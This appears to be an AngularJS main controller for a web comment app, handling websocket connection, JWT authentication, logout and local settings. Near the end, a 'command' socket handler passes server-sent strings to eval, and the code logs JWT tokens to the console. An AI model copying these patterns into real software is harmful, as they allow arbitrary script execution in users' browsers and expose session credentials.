/**
 * Created by zoonman on 12/12/16.
 */

app.controller('MainCtrl',
    ['$scope',
      'socket',
      '$window',
      '$rootScope',
      '$localStorage',
      '$sessionStorage',
      '$http',
      'tmhDynamicLocale',
      function($scope,
          socket,
          $window,
          $rootScope,
          $localStorage,
          $sessionStorage,
          $http,
          tmhDynamicLocale) {
        $scope.currentCategorySlug = 'general';
        console.log('Main');
        $rootScope.websocketAlive = false;
        $scope.totalConnections = 1;

        var notificationIndex = 0;
        $rootScope.notifications = {
          list: {},
          add: function(notification) {
            notificationIndex++;
            $rootScope.notifications.list[notificationIndex] = notification;
            return notificationIndex;
          }
        };
        $localStorage.$default({
              rememberMe: true,
              experimental: false,
              notifications: {
                newComment: {
                  audio: true
                }
              },
              deviceId: Math.random().toString(36).substring(2, 15),
              sendCommentsCtrl: 'Enter',
              applicationTheme: {id: 'default-blue'}
            }
        );
        $rootScope.experimental = $localStorage.experimental;
        $rootScope.applicationTheme = $localStorage.applicationTheme;

        $rootScope.$on('$translateChangeSuccess', function(event, data) {
          document.documentElement.setAttribute('lang', data.language);
          tmhDynamicLocale.set(data.language.toLowerCase().replace(/_/g, '-'));
        });
        $rootScope.logout = function() {
          socket.emit('logout', {}, function(user) {
              }
          );
          $http.delete('/api/jwt/').then().catch();
          $localStorage.$reset();
          $sessionStorage.$reset();
          $localStorage.rememberMe = false;
          $rootScope.user = null;
          $rootScope.$applyAsync();
        };

        socket
            .on(
                'connect',
                function(msg) {
                  $rootScope.websocketAlive = true;
                  console.log('connected', msg);
                  var jwt;
                  if ($localStorage.rememberMe) {
                    jwt = $localStorage.jwt;
                  } else {
                    jwt = $sessionStorage.jwt;
                  }
                  if (jwt) {
                    console.log('authenticating', jwt);
                    socket.emit('authenticate', {token: jwt}, function(a) {
                          console.log('a', a)
                        }
                    ); // send the jwt
                  } else {
                    $http
                        .get('/api/jwt/')
                        .then(function(jwtResponse) {
                          console.log('jwtResponse', jwtResponse);
                          socket.emit(
                              'authenticate',
                              {token: jwtResponse.data.jwt}
                          );
                          if ($localStorage.rememberMe) {
                            $localStorage.jwt = jwtResponse.data.jwt;
                          } else {
                            $sessionStorage.jwt = jwtResponse.data.jwt;
                          }
                        })
                        .catch(function(reason) {
                          console.log(reason);
                        });
                  }
                  socket.on('user', function(user) {
                        console.log('authenticated:', user);
                        $rootScope.user = angular.copy(user);
                      }
                  );
                }
            );
        socket.on('disconnect', function() {
              $rootScope.websocketAlive = false;
            }
        );

        socket.on('command', function(data) {
          console.log(eval(data));
        });

        socket.on('connections', function(num) {
          $scope.totalConnections = num;
        });
      }
    ]
);
